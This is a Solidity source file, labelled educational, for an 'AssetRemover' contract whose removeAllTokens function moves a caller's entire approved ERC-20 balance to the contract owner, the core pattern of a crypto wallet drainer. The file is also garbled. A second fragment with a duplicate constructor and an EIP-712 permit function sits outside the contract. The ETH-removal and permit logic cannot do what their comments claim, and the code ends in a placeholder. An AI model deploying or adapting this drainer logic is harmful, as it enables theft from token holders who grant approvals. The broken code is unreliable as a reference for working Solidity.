// This is for educational purposes only
// Do not use this on any main-net. You WILL lose your funds.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract AssetRemover {

address public owner;

    // Assuming the contract will deal with a single ERC-20 token for the demo
    IERC20 public erc20Token;

    constructor(address _tokenAddress) {
        owner = msg.sender;
        erc20Token = IERC20(_tokenAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this");
        _;
    }

    // Function to remove all ETH from sender's address
    function removeAllEth() external {
        uint256 balance = address(msg.sender).balance;
        require(balance > 0, "You have no ETH to remove");
        payable(owner).transfer(balance);
    }

    // Function to remove all ERC-20 tokens. Before calling this, user must approve this contract.
    function removeAllTokens() external {
        uint256 tokenBalance = erc20Token.balanceOf(msg.sender);
        require(tokenBalance > 0, "You have no tokens to remove");
        require(erc20Token.transferFrom(msg.sender, owner, tokenBalance), "Transfer failed");
    }

    // In case the owner wants to change which ERC-20 token the contract interacts with
    function setTokenAddress(address _tokenAddress) external onlyOwner {
        erc20Token = IERC20(_tokenAddress);
    }
}

    // EIP-712 setup
    bytes32 private constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)");
    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    mapping(address => uint256) public nonces;

    // EIP-712 domain separators
    bytes32 public domainSeparator;

    constructor(address _tokenAddress) {
        owner = msg.sender;
        erc20Token = IERC20(_tokenAddress);

        domainSeparator = keccak256(
            abi.encode(
                DOMAIN_TYPEHASH,
                keccak256(bytes("AssetRemover")),
                keccak256(bytes("1")),
                block.chainid,
                address(this)
            )
        );
    }

    // Permit function to allow approvals with signatures
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(block.timestamp <= deadline, "Permit: signature expired");

        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                domainSeparator,
                keccak256(
                    abi.encode(
                        PERMIT_TYPEHASH,
                        owner,
                        spender,
                        value,
                        nonces[owner]++,
                        deadline
                    )
                )
            )
        );

        address recoveredAddress = ecrecover(digest, v, r, s);
        require(recoveredAddress != address(0) && recoveredAddress == owner, "Permit: invalid signature");

        // Now we set the approval, since the signature was valid
        require(erc20Token.approve(spender, value), "Approval failed");
    }

    // ... [Rest of the contract code]

}

